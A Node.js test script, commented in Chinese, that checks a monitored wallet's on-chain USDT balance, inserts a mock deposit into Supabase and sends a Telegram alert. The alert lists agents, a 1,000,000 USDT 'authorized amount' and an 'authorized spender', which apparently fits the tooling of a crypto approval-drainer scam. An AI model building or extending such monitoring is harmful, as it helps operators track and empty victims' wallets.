const { ethers } = require('ethers');
require('dotenv').config({ path: '../.env.local' });

// 配置
const ETH_RPC_URL = process.env.ETH_RPC_URL || 'https://ethereum.publicnode.com';
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const TEST_ADDRESS = '0xbDa6620688a7B3D574FF7C234090Dc2e51Fc7077';

// USDT合约ABI
const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "balance", "type": "uint256"}],
    "type": "function"
  }
];

async function testRealTimeNotification() {
  try {
    console.log('🚀 开始测试实时通知系统...\n');
    
    // 1. 检查监听地址状态
    console.log('📋 1. 检查监听地址状态');
    const { createClient } = require('@supabase/supabase-js');
    const supabase = createClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL,
      process.env.SUPABASE_SERVICE_ROLE_KEY
    );
    
    const { data: monitorData } = await supabase
      .from('wallet_monitor')
      .select('*')
      .eq('wallet_address', TEST_ADDRESS.toLowerCase())
      .eq('is_active', true);
    
    console.log(`监听状态: ${monitorData && monitorData.length > 0 ? '✅ 已监听' : '❌ 未监听'}`);
    
    // 2. 检查链上USDT余额
    console.log('\n📋 2. 检查链上USDT余额');
    const provider = new ethers.JsonRpcProvider(ETH_RPC_URL);
    const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
    const balance = await usdtContract.balanceOf(TEST_ADDRESS);
    const usdtBalance = ethers.formatUnits(balance, 6);
    console.log(`USDT余额: ${parseFloat(usdtBalance).toFixed(6)} USDT`);
    
    // 3. 模拟交易记录插入
    console.log('\n📋 3. 模拟交易记录插入');
    const mockTransaction = {
      user_address: TEST_ADDRESS,
      transaction_type: 'in',
      amount: '100.000000',
      token: 'USDT',
      tx_hash: '0x' + Math.random().toString(16).substr(2, 64),
      block_number: await provider.getBlockNumber(),
      timestamp: new Date().toISOString(),
      from_address: '0x1111111111111111111111111111111111111111',
      to_address: TEST_ADDRESS,
      is_processed: false,
      processed_at: null,
      notification_sent: false,
      error_message: null,
      created_at: new Date().toISOString()
    };
    
    console.log('模拟交易数据:', {
      from: mockTransaction.from_address,
      to: mockTransaction.to_address,
      amount: mockTransaction.amount,
      tx_hash: mockTransaction.tx_hash
    });
    
    // 4. 插入模拟交易
    const { data: insertResult, error: insertError } = await supabase
      .from('wallet_transactions')
      .insert(mockTransaction)
      .select();
    
    if (insertError) {
      console.error('❌ 插入交易失败:', insertError);
      return;
    }
    
    console.log('✅ 模拟交易已插入:', insertResult[0].id);
    
    // 5. 检查触发器是否工作
    console.log('\n📋 4. 检查通知队列');
    await new Promise(resolve => setTimeout(resolve, 2000)); // 等待2秒
    
    const { data: notifications } = await supabase
      .from('telegram_notification_queue')
      .select('*')
      .eq('user_address', TEST_ADDRESS)
      .order('created_at', { ascending: false })
      .limit(5);
    
    console.log(`通知队列记录数: ${notifications ? notifications.length : 0}`);
    if (notifications && notifications.length > 0) {
      console.log('最新通知:', notifications[0]);
    }
    
    // 6. 手动发送测试通知
    console.log('\n📋 5. 手动发送测试通知');
    const testMessage = `
**钱包余额**: 100.000000
**顶层代理**: 默认代理
**代理昵称**: 直链注册
**用户编号**: 1
**用户备注**: 暂无备注
**是否活动**: 是
**用户钱包**: 
${TEST_ADDRESS}
**授权金额**: 1000000 USDT
**客户地址**: 
${TEST_ADDRESS.toLowerCase()}
**授权对象**: 
0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218
**执行操作**: 客户USDT余额增加
**交易金额**: +100.000000 USDT
**交易哈希**: ${mockTransaction.tx_hash}
    `.trim();
    
    console.log('测试消息已准备，准备发送到Telegram...');
    
    // 7. 发送到Telegram
    const fetch = require('node-fetch');
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: testMessage,
          parse_mode: 'Markdown'
        })
      });
      
      const telegramResult = await telegramResponse.json();
      
      if (telegramResult.ok) {
        console.log('✅ 测试通知已发送到Telegram群组');
      } else {
        console.error('❌ Telegram发送失败:', telegramResult);
      }
    } else {
      console.error('❌ Telegram配置缺失');
    }
    
    console.log('\n🎯 测试完成!');
    
  } catch (error) {
    console.error('❌ 测试失败:', error);
  }
}

// 运行测试
testRealTimeNotification();


